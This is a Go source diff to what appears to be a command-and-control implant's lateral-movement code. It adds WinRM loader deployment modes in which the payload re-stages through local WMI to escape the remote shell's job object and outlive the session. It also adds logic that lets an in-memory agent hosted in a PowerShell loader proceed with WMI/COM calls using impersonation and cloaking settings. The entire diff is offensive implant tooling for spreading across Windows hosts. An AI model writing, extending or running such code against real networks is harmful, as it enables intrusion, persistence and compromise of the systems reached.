@@ -44,6 +44,11 @@ type lateralPayload struct {
 	// process's own binary, so the source session's hosting mode is
 	// irrelevant to the deployment.
 	loaderDeploy bool
+	// independentLifetime selects the WinRM loader mode whose target host
+	// process escapes the shell job through a local WMI re-stage: the
+	// source tears the WinRM session down as soon as the independent
+	// receiver confirms readiness, instead of holding the shell.
+	independentLifetime bool
 }
 
 var lateralMethods = map[string]bool{
@@ -100,6 +105,34 @@ func memoryHosted() bool {
 // server instead of this binary.
 func lateralUsesSelfBinary(payload lateralPayload) bool {
 	return !payload.loaderDeploy
+}
+
+// rpcETooLate is CoInitializeSecurity's rejection when process-wide COM
+// security was already configured by an earlier initializer.
+const rpcETooLate uintptr = 0x80010119
+
+// wmiSecurityResult decides whether a CoInitializeSecurity HRESULT lets the
+// lateral COM machinery proceed. A memory-hosted agent runs inside its
+// PowerShell loader host, and the CLR configured process COM security
+// before this code could: rejecting that state would block every lateral
+// deployment from an in-memory source, the loader chain's flagship
+// scenario. Accepting it is safe for the WMI chain because the per-proxy
+// CoSetProxyBlanket calls still apply dynamic cloaking and packet privacy
+// to the actual interface calls; the caveat is that the initial remote
+// connect authenticates with the host process security rather than a
+// make_token thread token. Any other pre-initialized state on an on-disk
+// agent stays fail-closed, because its blanket owner is unknown.
+func wmiSecurityResult(hr uintptr) error {
+	switch {
+	case hr == 0:
+		return nil
+	case hr == rpcETooLate && memoryHosted():
+		return nil
+	case hr == rpcETooLate:
+		return errors.New("CoInitializeSecurity with thread cloaking rejected: process COM security was already initialized by another component (0x80010119)")
+	default:
+		return fmt.Errorf("CoInitializeSecurity with thread cloaking failed: 0x%08x", hr)
+	}
 }
 
 // awaitLateralResult preserves acknowledged artifacts when the command expires.
@@ -214,6 +247,21 @@ func parseLateralPayload(command string) (lateralPayload, error) {
 			return payload, errors.New("insecure wire method conflicts with certificate validation")
 		}
 		payload.Method, payload.HTTPS, payload.Insecure, payload.loaderDeploy = "winrm", true, true, true
+	case "winrm_loader_independent":
+		if payload.HTTPS {
+			return payload, errors.New("https belongs to the winrm_https_loader_independent wire method")
+		}
+		payload.Method, payload.loaderDeploy, payload.independentLifetime = "winrm", true, true
+	case "winrm_https_loader_independent":
+		if payload.Insecure {
+			return payload, errors.New("insecure belongs to the winrm_https_insecure_loader_independent wire method")
+		}
+		payload.Method, payload.HTTPS, payload.loaderDeploy, payload.independentLifetime = "winrm", true, true, true
+	case "winrm_https_insecure_loader_independent":
+		if len(transport.Insecure) != 0 && !payload.Insecure {
+			return payload, errors.New("insecure wire method conflicts with certificate validation")
+		}
+		payload.Method, payload.HTTPS, payload.Insecure, payload.loaderDeploy, payload.independentLifetime = "winrm", true, true, true, true
 	}
 	payload.Host = strings.Trim(strings.TrimSpace(payload.Host), `\`)
 	payload.RemoteName = strings.TrimSpace(payload.RemoteName)
@@ -269,6 +317,11 @@ func parseLateralPayload(command string) (lateralPayload, error) {
 		}
 	} else if payload.PayloadSHA256 != "" {
 		return payload, errors.New("payload_sha256 requires a loader deployment method")
+	}
+	// Only the WinRM loader chain offers the independent lifetime: the
+	// receiver re-stages through local WMI to escape the shell's job object.
+	if payload.independentLifetime && (payload.Method != "winrm" || !payload.loaderDeploy) {
+		return payload, errors.New("independent lifetime requires a winrm loader deployment")
 	}
 	if !lateralRemoteNamePattern.MatchString(payload.RemoteName) {
 		return payload, errors.New("remote_name must be a simple .exe filename")
